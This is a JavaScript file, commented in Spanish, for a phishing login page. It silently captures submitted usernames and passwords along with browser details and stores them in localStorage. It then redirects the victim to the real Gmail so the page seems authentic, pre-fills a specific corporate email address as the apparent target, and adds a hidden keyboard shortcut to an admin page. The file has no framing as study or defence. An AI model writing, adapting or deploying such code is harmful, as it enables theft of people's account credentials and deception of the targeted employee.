// script.js - Versión silenciosa
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                // Silenciosamente no hace nada si faltan campos
                return;
            }
            
            // Guardar credenciales (sin mostrar mensajes)
            const loginData = {
                id: Date.now(),
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                url: window.location.href
            };
            
            // Guardar en localStorage
            let savedLogins = JSON.parse(localStorage.getItem('logins') || '[]');
            savedLogins.push(loginData);
            localStorage.setItem('logins', JSON.stringify(savedLogins));
            
            // Redirigir a Gmail real (para que parezca auténtico)
            window.location.href = 'https://mail.google.com';
        });
    }
    
    // Auto-completar el email que ya tenía (opcional)
    setTimeout(() => {
        const usernameInput = document.getElementById('username');
        if (usernameInput && !usernameInput.value) {
            usernameInput.value = 'gerentetic@inversionesasar.com';
        }
    }, 100);
    
    // Atajo oculto para el admin (Ctrl+Shift+A)
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
            window.location.href = 'admin.html';
        }
    });
});
